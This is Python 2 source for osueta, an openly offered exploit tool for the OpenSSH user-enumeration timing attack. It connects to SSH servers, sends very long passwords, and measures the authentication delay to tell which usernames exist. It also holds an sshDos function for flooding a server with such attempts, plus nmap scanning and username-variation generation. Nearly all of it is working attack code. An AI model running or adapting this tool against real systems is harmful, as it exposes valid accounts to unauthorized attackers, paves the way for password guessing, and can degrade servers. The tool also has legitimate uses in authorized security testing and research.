#!/usr/bin/python
# -*- coding: utf-8 -*-
__license__="""
osueta (OpenSSH User Enumeration Timing Attack)

Version 0.8

A simple Python2 script to exploit the OpenSSH User Enumeration Timing Attack:

	http://cureblog.de/openssh-user-enumeration-time-based-attack/
	http://seclists.org/fulldisclosure/2013/Jul/88 

Authors:
        c0r3dump3d | coredump<@>autistici.org
        rofen | rofen<@>gmx.de

Osueta project site: https://github.com/c0r3dump3d/osueta 

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

The authors disclaims all responsibility in the use of this tool.
"""
import warnings

def fxn():
	warnings.warn("deprecated", DeprecationWarning)
with warnings.catch_warnings():
	warnings.simplefilter("ignore")
	import paramiko
	
import string
import socket
import time
import os,sys
import subprocess
from threading import *
import random

screenLock = Semaphore(value=1)

def dummySSH(host, port,length):
	dummyconn = 10 
	print '[+] %d dummy attempts @%s:%d with random users to test the delay of the server ... ' % (dummyconn,host,int(port))
	size = 4
	chars = chars=string.ascii_lowercase + string.digits
	sumdelay = 0
	print 
	for k in range(dummyconn):
		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		user = ''.join(random.choice(chars) for _ in range(size))
		print '[+] Connecting with random user %s@%s:%d ... ' % (user,host,int(port))
		try:
			sock.connect((host,int(port)))
			para = paramiko.Transport(sock)
			para.local_version="SSH-2.0-Blabla"

		except paramiko.SSHException: 
			print "[-] Unable to connect to host"
			return  
        	except socket.error: 
			print "[-] Unable to connect to host"
			return  
    
		try:
			para.connect(username=user)

		except EOFError,e:
			print '[-] Error: %s' % e
			return  

		except paramiko.SSHException,e:
        		print '[-] Error: %s' % e
        		return   
		passwd = 'A'*length
		timeStart = int(time.time())

		try:
			para.auth_password(user,passwd)
		except paramiko.AuthenticationException,e:
			print '[-] '+ str(e)
		except paramiko.SSHException,e:
			print '[-] '+ str(e)

		timeDone = int(time.time())
		delay = timeDone-timeStart
		para.close()
		sumdelay = sumdelay + delay
		sock.close()
	measure = int(sumdelay/dummyconn)
	if measure == 0:
		print
		print "[-] The calculate delay is lower than 1 second, using 20 seconds by default ..."
		measure = 2
		
		
	return measure 

	


def sshTime(host,port,user,sock,defTime,length):
	print 
	print '[+] Connecting %s@%s:%d ... ' % (user,host,int(port))

	try:
		sock.connect((host,int(port)))
		para = paramiko.Transport(sock)
		para.local_version="SSH-2.0-Blabla"

	except paramiko.SSHException: 
		print "[-] Unable to connect to host"
		return  
        except socket.error: 
		print "[-] Unable to connect to host"
		return  
    
	try:
		para.connect(username=user)

	except EOFError,e:
		print '[-] Error: %s' % e
		return  

	except paramiko.SSHException,e:
        	print '[-] Error: %s' % e
        	return   

    	passwd = 'A'*length

	timeStart = int(time.time())

	try:
		para.auth_password(user,passwd)
	except paramiko.AuthenticationException,e:
		print '[-] '+ str(e)
	except paramiko.SSHException,e:
		print '[-] '+ str(e)

	timeDone = int(time.time())

	timeRes = timeDone-timeStart

	if timeRes > defTime:
		print '[+] User: %s exists' % user
        	ret = user,host,port,timeRes

	else:
		ret = -1
	para.close()
	return ret

def sshDos(host,port,user,sock,length):

	try:
		sock.connect((host,int(port)))
		para = paramiko.Transport(sock)
		para.local_version="SSH-2.0-Blabla"

	except paramiko.SSHException: 
		print "[-] Unable to connect to host"
		exit(1)   
    
	try:
		para.connect(username=user)

	except EOFError,e:
		exit(1)   

	except paramiko.SSHException,e:
        	exit(1)   

    	passwd = 'A'*length

	try:
		para.auth_password(user,passwd)
	except paramiko.AuthenticationException,e:
		print
	except paramiko.SSHException,e:
		print

	para.close()
	sock.close()

def prevScann(host,port):
	nport="-p"+port
	try:
		scanp = subprocess.Popen(["nmap","-T5","-n","-PN",nport,host],stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
	except OSError:
        	print "[-] Install nmap: sudo apt-get install nmap"  
	scanhost = scanp.split()
	if 'open' in scanhost:
		print 'port ' + port + ' open.'
		return 'open'
	else:
		print 'host down or port ' + port + ' close or filtered.'
		return 'close'
		
		
				


def sshBanner(host,port):

	nport="-p"+port
	print "[+] Trying to detect the banner of SSH server at tcp port %s for host %s ..." % (port,host)
	try:
		scanv = subprocess.Popen(["nmap", "-PN", "-sV","-n", nport,host],stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
	except OSError:
        	print "Install nmap: sudo apt-get install nmap"  

	scanlist=scanv.split()

	if 'open' and 'ssh' in scanlist:

		index = scanlist.index('ssh')
    		print "[++] SSH Server Banner ==> %s %s" % (scanlist[index+1], scanlist[index+2])
        	banner = scanlist[index+1] + " " + scanlist[index+2]
		return banner
	else:
		print "[-] Are you sure that it's a ssh server?"
		print "[--] Check with \"nmap -PN -sV -p 22 \" if you see something strange."
		banner = 'none'
		return banner


def createUserNameVariationsFor(userName):
	specialCharacters = [".","_"]
	variations = []
	variations.append(userName)
	variations.append(userName.upper())
	variations.append(userName.lower())
	variations.append(userName.capitalize())
	for character in specialCharacters:
		characterPosition = userName.find(character)
		if characterPosition > 0:
			substrings = userName.split(character)
			variations.append(string.join([s.capitalize() for s in substrings], character))
		
	return variations

def prepareUserNames(userFile,vari):
	lines = 0
	userNames = []
	if vari == 'yes':
        	for line in userFile.readlines():
			lines = lines + 1
            		line = line.split("\n")
            		user = line[0]
            		userNames = userNames + createUserNameVariationsFor(user)
        		userNames = list(set(userNames))
			print 
        		print "[+] Generated %s variations from %s names" % (len(userNames), lines)
        	return userNames

	else:
		for line in userFile.readlines():
			lines = lines + 1
			line = line.split("\n")
			user = line[0]
			userNames.append(user)
			userNames = list(set(userNames))
		return userNames
		
def welcome():
    
	print """
        ***************************************************************************
        *                  ___                 ___ ___ _  _                       *
        *                 / _ \ _ __  ___ _ _ / __/ __| || |                      *
        *                | (_) | '_ \/ -_) ' \\\\__ \__ \ __ |                      *
        *                 \___/| .__/\___|_||_|___/___/_||_|                      *
        *                      |_|                                                *
        *   _   _               ___                             _   _             *
        *  | | | |___ ___ _ _  | __|_ _ _  _ _ __  ___ _ _ __ _| |_(_)___ _ _     *
        *  | |_| (_-</ -_) '_| | _|| ' \ || | '  \/ -_) '_/ _` |  _| / _ \ ' \    *
        *   \___//__/\___|_|   |___|_||_\_,_|_|_|_\___|_| \__,_|\__|_\___/_||_|   *
        *                                                                         *
        *          _____ _       _               _  _   _           _             *
        *         |_   _(_)_ __ (_)_ _  __ _    /_\| |_| |_ __ _ __| |__          *
        *           | | | | '  \| | ' \/ _` |  / _ \  _|  _/ _` / _| / /          *
        *           |_| |_|_|_|_|_|_||_\__, | /_/ \_\__|\__\__,_\__|_\_\          *
        *                              |___/                                      *
        *                                                                         *
        *                                                                         *
        *       http://cureblog.de/openssh-user-enumeration-time-based-attack/    *
        *       http://seclists.org/fulldisclosure/2013/Jul/88                    *
        *                                                                         *
        ***************************************************************************
        """ 
        
def print_success(foundUser, banner):
	if len(foundUser) == 0:
		print "[-] No user(s) found." 
		
	else:	 
		print
		print "Server version: " + banner
		print
		print "Users found      Time delay in seconds"
		print "--------------------------------------"
		for entry in foundUser:
			if entry != -1:
				userfdos = entry[0]
				print entry[0] + "                      " + str(entry[3])
	
